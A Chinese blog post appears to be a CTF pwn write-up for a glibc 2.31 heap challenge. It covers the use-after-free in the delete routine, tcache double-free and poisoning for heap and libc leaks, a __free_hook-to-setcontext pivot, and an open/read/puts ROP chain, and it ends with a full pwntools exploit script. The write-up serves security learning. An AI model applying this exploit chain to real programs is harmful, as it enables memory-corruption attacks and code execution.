一、题目代码分析12345678910int sub_1641()&#123;  puts(&quot;1.Give birth to a child&quot;);  puts(&quot;2.Change child&#x27;s name&quot;);  puts(&quot;3.Show children&#x27;s name&quot;);  puts(&quot;4.Remove your child&quot;);  puts(&quot;5.Edit child&#x27;s description.&quot;);  puts(&quot;6.Exit&quot;);  return printf(&quot;&gt;&gt; &quot;);&#125;



base+4060这个地址存储的是标志位,表示是否被使用了 （ 记为 chunk_list_flag)
base+40a0存储的是chunk的地址（ 记为 chunk_list)
chunk结构分析如下
0x0 → pre_size 
0x8 → size
 0x10 → name 
0x18 → gender 
0x20 → des 
1. add添加的话可以重复添加到一个序号，覆盖之前的，比如一直选择1号，第二次添加会覆盖第一次的
2. changename逻辑就是判断chunk_list_flag是否为1，为1的话，说明存在这个chunk，然后就去修改
3. show​	要检查chunk_list_flag、
4. delete​		这里存在漏洞，未检查chunk_list_flag, 并且free之后没有清零， 存在UAF
1234567891011121314151617181920int sub_196B()&#123;  __int64 v0; // rax  int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input index?&quot;);  LODWORD(v0) = sub_15E9();  v2 = v0;  if ( (int)v0 &gt;= 0 &amp;&amp; (int)v0 &lt;= 9 )  &#123;    v0 = qword_40A0[(int)v0];    if ( v0 )    &#123;      free((void *)qword_40A0[v2]);      dword_4060[v2] = 0;      LODWORD(v0) = puts(&quot;Done&quot;);    &#125;  &#125;  return v0;&#125;

​		首先dword_4060并没有检查，那你把它置为0又有什么用呢？ 反正没有检查，然后虽然把40a0处的地址释放了，但是没有清0呀，导致还可以继续释放
5. changecontent也是先判断chunk_list_flag是否为1
666. 改性别只能改一次，这里并没有检查chunk_list_flag，所以一定要细心，当时没仔细看这里,并且会直接打印当前的性别，所以可以利用这个进行信息泄露，因为这里是bk的位置
如果目标堆块处于 tcache中，那么修改性别就能泄露 堆地址
如果目标堆块处于 unsort bin中，那么修改性别就有可能泄露 libc地址
二、解题思路分析保护全开12345Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled

开启了沙箱​	常规思路便是通过ORW来读取flag
12345678910 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0007: 0x06 0x00 0x00 0x00000000  return KILL



libc版本2.31版本： Ubuntu GLIBC 2.31-0ubuntu9
​	ORW的一个通用思路是劫持free_hook等，写入setcontext的gadget，来设置相应的寄存器，然后劫持控制流，2.29版本之前和之后有所不同（  之前可以直接通过rdi索引， rdi是传入的chunk的地址）
setcontext2.29之前
12345678&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]

​		之后
123456789101112131415161718192021580dd:       48 8b a2 a0 00 00 00    mov    rsp,QWORD PTR [rdx+0xa0]580e4:       48 8b 9a 80 00 00 00    mov    rbx,QWORD PTR [rdx+0x80]580eb:       48 8b 6a 78             mov    rbp,QWORD PTR [rdx+0x78]580ef:       4c 8b 62 48             mov    r12,QWORD PTR [rdx+0x48]580f3:       4c 8b 6a 50             mov    r13,QWORD PTR [rdx+0x50]580f7:       4c 8b 72 58             mov    r14,QWORD PTR [rdx+0x58]580fb:       4c 8b 7a 60             mov    r15,QWORD PTR [rdx+0x60]580ff:       64 f7 04 25 48 00 00    test   DWORD PTR fs:0x48,0x258106:       00 02 00 00 005810b:       0f 84 b5 00 00 00       je     581c6 &lt;setcontext@@GLIBC_2.2.5+0x126&gt;    ........................581c6:       48 8b 8a a8 00 00 00    mov    rcx,QWORD PTR [rdx+0xa8]581cd:       51                      push   rcx581ce:       48 8b 72 70             mov    rsi,QWORD PTR [rdx+0x70]581d2:       48 8b 7a 68             mov    rdi,QWORD PTR [rdx+0x68]581d6:       48 8b 8a 98 00 00 00    mov    rcx,QWORD PTR [rdx+0x98]581dd:       4c 8b 42 28             mov    r8,QWORD PTR [rdx+0x28]581e1:       4c 8b 4a 30             mov    r9,QWORD PTR [rdx+0x30]581e5:       48 8b 92 88 00 00 00    mov    rdx,QWORD PTR [rdx+0x88]581ec:       31 c0                   xor    eax,eax581ee:       c3                      ret

​	能看到这里有两个重点，一个是mov    rsp,QWORD PTR [rdx+0xa0]，另外一个是mov    rcx,QWORD PTR [rdx+0xa8]；push   rcx
​	从这里可以看出，如果能控制rdx及其所在区域（比如一个chunk），那么就可以控制rsp，rcx，然后ret到rsp所在区域继续执行。
​	问题就转换为了如何控制rdx
特殊gadgetlibcbase + 0x1547a0
12mov rdx, qword ptr [rdi + 8]   # 设置rdxcall qword ptr [rdx + 0x20]    # 填入setcontext gadget的地址

​	所以可以先想办法控制rdi及其所在区域，然后跳转到setcontext （伪造或者定制一个特殊的chunk即可）


三、利用步骤1.泄露地址泄露堆地址​		利用tcache的double free，free进到tcache是不做检查的，所以才要先add一下，让tcache有一个空位


​		当第二次free(8)的时候，8已经被free两次了其实，一次在usbin中，一次在tcache中
​		这里继续add(0,1,’1’) 占据的是0号的chunk_list,这里申请到的是tcache中的8，bb20。 如此一来，chunk_list的0号和8号都是一个chunk了, 这样一个free后,另一个就可以show来泄露信息

​		然后继续free(8), 虽然8不能show，但这时候0是可以show的，所以show 0就得到了泄露的堆地址		
123456789101112131415161718# ----------------------------- 1 利用double free构造堆块重叠， 泄露heap和libc地址for i in range(10):    add(i,1,&#x27;a&#x27;)for i in range(7):    # 填充满tcache     free(6-i)# 合并进入usbin， 先8后7，反过来呢？ 没影响 这俩合并在一起。 目的其实是后面可以单独操纵其中一块free(7)free(8)# 从tcache中取出第一块分配， tcache后进先出， 所以分配的是0号add(0,1,&#x27;1&#x27;)# 这里用到了double free，将合并状态下的一部分chunk放入tcache，造成堆块重叠（谁和谁重叠呢？ tcache的第一个和usbin的？free(8) # 为啥这里能再次free呢？ free进tcahe，所以前面用到了一个add。。add(0,1,&#x27;1&#x27;)# 再次申请，使放入tcache中的usbin chunk被分配（8号），泄露堆地址（为什么还是可以0呢？编号是可以覆盖的，但是实际上还是要创建新的内存free(8)   # 继续double free 这里会填入地址啦，就是从这里泄露的show(0)  # 为什么不能show 8呢 要检测chunk_list_flagru(&#x27;nder: &#x27;)heap_addr = uu64(r(6))leak(heap_addr)

泄露libc地址    把tcache都申请了，然后把unsortedbin再申请一半，剩下的一半的fd和bk就是main_arena的地址了

​		记住这里申请的1的话也是bb20，就是那个uaf的堆块，这样的话，0 1都是它了，然后show 0 (1也行)就能show出来usbin的bk，也就能泄露堆地址了
123456for i in range(1,9):    add(i,1,str(i)+str(i))show(0)ru(&#x27;nder: &#x27;)base = uu64(r(6))-0x1ebbe0leak(base)



2. 在堆块上布置 触发 setcontext链的 gadget及setcontext用到的数据

原理​	因为是第一次使用这个手法,看原文wp很蒙, 但结合后面的步骤就理解了.
​	其实这里就是要布置一下触发free_hook之后的行为,让它设置好rdx后把控制流转到setcontext, 我们是把free_hook修改为了这个gadget
12mov rdx, qword ptr [rdi + 8]call qword ptr [rdx + 0x20]

​	于是乎,在free触发的时候，传入的第一个参数rdi是 要free的chunk的地址 
​	所以就是把chunk+8处的值传给rdx，也就是heap_addr+0x3a8-0x18，然后把heap_addr+0x3a8-0x18+0x20处的值，当作函数的地址进行调用, 在知道chunk地址的前提下,rdi+8可控的话,rdx+0x20的值也是可控的,
​	然后跳到setcontext之后，还是以这个chunk为基础进行设置值，在setcontext中，用到了0xa0和0xa8,分别代表了rsp和ret后的第一条指令。
​	所以最终会布置成这个样子

实现步骤​	这里的目标是修改一个堆块的gender(chunk+8),虽然有666那个地方可以修改,但还是先用复杂一点的方法来. 如果要修改的话,就需要进行一个任意地址写,所以可以通过tcache poison (类似于double free) 申请到一个堆头前面的地址,然后来实现修改gender的效果
​	这里的目标就是修改fd，把fd修改为要修改gender堆块的上面的地址
​	free(3)  上面的一个堆块，不知道为啥要选定这个（大概可以随便选一个，和0x380对应就行）
​	free(1)  1指向的堆块其实是bb20，也就是前面一直利用的覆盖的那半个220的堆块 ，这里用到了uaf，0的位置也是bb20，这时候编辑它，修改了fd （这里可见，chunk_list的0和1都是这个块，造成uaf）
​	然后两次add，就让9获得了要伪造堆块的地址（ 为什么不直接在这里获取free_hook呢？ 为什么要在这里伪造堆块呢？）（因为要修改bk，也就是rdi+8这个位置，作者这样弄其实是复杂了，虽然很通用，其实题目给出了一次修改性别的机会，估计就是用来干这个的)
​	然后布置好chunk+8以及chunk+8所指向的地址的内容( 那个特殊的gadget		
12345678910111213141516# ----- 2 构造堆块重叠，使得可以向chunk+8位置写入数据；令在堆块上布置 跳往 setcontext链 的gadgetadd(9,1,&#x27;a&#x27;)   # 获取下面那一块usbin，这样的话 0 1 9 都是bb20了free(3)       free(1)name_edit(0,p64(heap_addr+0x380)[:-1]) # 要伪造的堆块的地址，也可以选其他的    add(8,1,&#x27;a&#x27;)add(9,1,&#x27;a&#x27;)    pl = p64(0) + p64(0x111)pl+= p64(0) + p64(heap_addr+0x3a8-0x18) # 在chunk2的gender字段放置地址addr，令addr+0x28指向chunk2的des字段pl+= p64(setcontext)pl+= (0xa0-len(pl))*&#x27;\x00&#x27; + p64(heap_addr+0x5d0) + p64(p_rdi_r)    content_edit(9,pl)



content_edit(9,pl) 这里就覆盖了之前的堆块了，至于为啥要写入390位置，因为要把这里当作头，然后3a0作为内容地址，这样就可以edit写入了，edit写入的其实是伪造了一个完整的堆块
3. 修改free_hook为 特殊 gadget

​	为什么要free7呢?	free(7)应该是为了绕过检测、  反正必须要free一个，应该会有计数检测， free个没有影响的就可以了
1234567# ----------------------------------------------- 3 set gadget into free_hookfree(7)free(8)pause()name_edit(0,p64(free_hook)[:-1])add(8,1,&#x27;8888&#x27;)add(7,1,p64(gadget)[:-1])



4. 布置ORW rop链1234567# ---------------------------------------------- 4 在堆块中布置rop链pl = p64(heap_addr+0xb10) + p64(p_rsi_r) + p64(0) + p64(open_addr)# 这里要注意选择open返回的fd指针pl+= p64(p_rdi_r) + p64(4) + p64(p_rsi_r) + p64(heap_addr+0x500) + p64(p_rdx_r12_r) + p64(0x30)*2 + p64(read_addr)pl+= p64(p_rdi_r) + p64(heap_addr+0x500) + p64(puts)content_edit(4,pl)name_edit(0,&#x27;/flag\x00\x00&#x27;)



​		这里红框的地址，指向flag字符串， 这里也是后面rop的起点，pop rdi的下一个位置，

5. free触发​	在free触发的时候，传入的第一个参数rdi是 要free的chunk的地址 free(2)，把这个参数传给特殊gadget，然后执行
12mov rdx, qword ptr [rdi + 8]call qword ptr [rdx + 0x20]

​	所以就是把b3b0+8处的值传给rdx，也就是b3a0，然后把b3a0+0x20处的值，当作函数的地址，也就是b3c0，也就是setcontext

setcontext &#x3D; base + sym(‘setcontext’) + 61


​	通过这个来设置寄存器的值，主要是通过rdx+ 0xa0 设置了rsp,	ret的时候跳到后面rop那里，开始rop
​	rdx + 0xa8位置设置 pop rdi；ret; 这里的话，会被放到rcx，然后push rcx，所以这么布置

这里其实设置哪个chunk都可以，只要找好对应关系就可以了
exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181#!/usr/bin/python#coding=utf-8#__author__:N1K0_from pwn import *import inspectfrom sys import argvdef leak(var):    callers_local_vars = inspect.currentframe().f_back.f_locals.items()    temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]    p.info(temp + &#x27;: &#123;:#x&#125;&#x27;.format(var))s      = lambda data               :p.send(data)sa      = lambda delim,data         :p.sendafter(delim, data)sl      = lambda data               :p.sendline(data)sla     = lambda delim,data         :p.sendlineafter(delim, data)r      = lambda numb=4096          :p.recv(numb)ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, b&#x27;\0&#x27;))uu64    = lambda data               :u64(data.ljust(8, b&#x27;\0&#x27;))plt     = lambda data               :elf.plt[data]got     = lambda data               :elf.got[data]sym     = lambda data               :libc.sym[data]itr     = lambda                    :p.interactive()local_libc  = &#x27;./libc.so.6&#x27;remote_libc = &#x27;&#x27;binary = &#x27;./pwn&#x27;context.binary = binaryelf = ELF(binary,checksec=False)p = process(binary)if len(argv) &gt; 1:    if argv[1]==&#x27;r&#x27;:        p = remote(&#x27;1&#x27;,1)libc = elf.libc# libc = ELF(remote_libc)def dbg(cmd=&#x27;&#x27;):    #os.system(&#x27;tmux set mouse on&#x27;)    context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]    gdb.attach(p,cmd)    pause()context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]gdb.attach(p)&quot;&quot;&quot;chunk_list = 0x40A0chunk_list_flag = 0x04060gender_chance = 0x4010&quot;&quot;&quot;# startcontext.log_level = &#x27;DEBUG&#x27;def add(idx,sex,name):    sla(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)    sla(&#x27;index?\n&#x27;,str(idx))    sla(&#x27;2.Girl:\n&#x27;,str(sex))    sa(&quot;Please input your child&#x27;s name:\n&quot;,name)def name_edit(idx,name):    sla(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)    sla(&#x27;index&#x27;,str(idx))    sa(&#x27;name:&#x27;,name)    ru(&#x27;Done!\n&#x27;)def show(idx):    sla(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)    sla(&#x27;index?&#x27;,str(idx))def free(idx):    sla(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)    sla(&#x27;index?&#x27;,str(idx))def change_sex(idx,sex):    sla(&#x27;&gt;&gt;&#x27;,&#x27;666&#x27;)    sla(&#x27;index?&#x27;,str(idx))    ru(&#x27;Current gender:&#x27;)    temp = uu64(r(6))    sla(&#x27;2.Girl:&#x27;,str(sex))    return tempdef content_edit(idx,data):    sla(&#x27;&gt;&gt;&#x27;,&#x27;5&#x27;)    sla(&#x27;index?&#x27;,str(idx))    sa(&#x27;description:&#x27;,data)def quit():    sla(&#x27;&gt;&gt;&#x27;,&#x27;6&#x27;)# ----------------------------- 1 利用double free构造堆块重叠， 泄露heap和libc地址for i in range(10):    add(i,1,str(i))for i in range(7):    free(6-i)# 合并进入usbinfree(8)# 合并进入usbinfree(7)# 合并进入usbin# 从tcache中取出第一块分配add(0,1,&#x27;0&#x27;)# 合并进入usbin# 将合并状态下的一部分chunk放入tcache，造成堆块重叠free(8)# 再次申请，使放入tcache中的usbin chunk被分配，泄露堆地址add(0,1,&#x27;0&#x27;)# 合并进入usbinfree(8)# 合并进入usbinshow(0)# 合并进入usbinru(&#x27;nder: &#x27;)heap_addr = uu64(r(6))leak(heap_addr)# 合并进入usbinfor i in range(1,9):    add(i,1,str(i)+str(i))show(0)ru(&#x27;nder: &#x27;)base = uu64(r(6))-0x1ebbe0leak(base)# --------------------------- 2 构造堆块重叠，使得可以向chunk+8位置写入数据；令在堆块上布置setcontext链open_addr  = base + sym(&#x27;open&#x27;)read_addr = base + sym(&#x27;read&#x27;)puts = base + sym(&#x27;puts&#x27;)gadget = base + 0x1547a0free_hook = base + sym(&#x27;__free_hook&#x27;)setcontext = base + sym(&#x27;setcontext&#x27;) + 61p_rdi_r = base + 0x26b72p_rdx_r12_r = base + 0x11c1e1p_rsi_r = base + 0x27529leak(free_hook)leak(gadget)add(9,1,&#x27;99&#x27;)free(3)free(1)name_edit(0,p64(heap_addr+0x380)[:-1])print(hex(heap_addr+0x380))add(8,1,&#x27;888&#x27;)add(9,1,&#x27;999&#x27;)pl = p64(0) + p64(0x111)pl+= p64(0) + p64(heap_addr+0x3a8-0x18) # 在chunk2的gender字段放置地址addr，令addr+0x28指向chunk2的des字段# setcontext&quot;&quot;&quot;gadget 0x154930    mov     rdx, [rdi+8]    mov     [rsp+0C8h+var_C8], rax    call    qword ptr [rdx+20h]&quot;&quot;&quot;pl+= p64(setcontext)pl+= (0xa0-len(pl))*b&#x27;\x00&#x27; + p64(heap_addr+0x5d0) + p64(p_rdi_r)content_edit(9,pl)# ----------------------------------------------- 3 set gadget into free_hookfree(7)free(8)pause()name_edit(0,p64(free_hook)[:-1])add(8,1,&#x27;8888&#x27;)add(7,1,p64(gadget)[:-1])# ---------------------------------------------- 4 在堆块中布置rop链pl = p64(heap_addr+0xb10) + p64(p_rsi_r) + p64(0) + p64(open_addr)# 这里要注意选择open返回的fd指针pl+= p64(p_rdi_r) + p64(4) + p64(p_rsi_r) + p64(heap_addr+0x500) + p64(p_rdx_r12_r) + p64(0x30)*2 + p64(read_addr)pl+= p64(p_rdi_r) + p64(heap_addr+0x500) + p64(puts)content_edit(4,pl)name_edit(0,&#x27;/flag\x00\x00&#x27;)#command = &#x27;b *&#x27;+ str(hex(gadget))+&#x27;\n&#x27;#dbg(command)# ---------------------------------------------- 5 triggerfree(2)# enditr()

</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/#content-inner">9</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-55-iofile入门之vtable劫持"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持">pwn入门-55-iofile入门之vtable劫持</a><time datetime="2024-02-11T08:43:00.000Z" title="发表于 2024-02-11 16:43:00">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用"><img src="/img/background/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-54-exit_hook函数利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用">pwn入门-54-exit_hook函数利用</a><time datetime="2024-02-11T08:01:29.000Z" title="发表于 2024-02-11 16:01:29">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析"><img src="/img/background/16.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-53-glibc之malloc源码分析"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析">pwn入门-53-glibc之malloc源码分析</a><time datetime="2024-02-11T05:40:56.000Z" title="发表于 2024-02-11 13:40:56">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop"><img src="/img/background/14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-52-iofile结合特殊gadget进行rop"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop">pwn入门-52-iofile结合特殊gadget进行rop</a><time datetime="2024-02-10T12:22:28.000Z" title="发表于 2024-02-10 20:22:28">2024-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用"><img src="/img/background/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-51-_IO_obstack_jumps利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用">pwn入门-51-_IO_obstack_jumps利用</a><time datetime="2024-02-10T12:21:41.000Z" title="发表于 2024-02-10 20:21:41">2024-02-10</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">虚拟化</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">调试</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">生活</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">科研(并没有)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(95, 31, 72)">旅游</a><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(67, 198, 167)">路由器</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(173, 133, 0)">浏览器安全</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(123, 19, 74)">C语言</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(124, 165, 51)">csapp</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(26, 101, 95)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(1, 70, 150)">堆</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(113, 102, 86)">脚本</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(190, 55, 61)">docker</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(48, 195, 77)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(17, 127, 6)">诗歌</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(163, 148, 145)">论文</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(44, 145, 15)">调试</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(71, 80, 167)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(145, 60, 198)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">88</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-18T15:57:21.380Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas 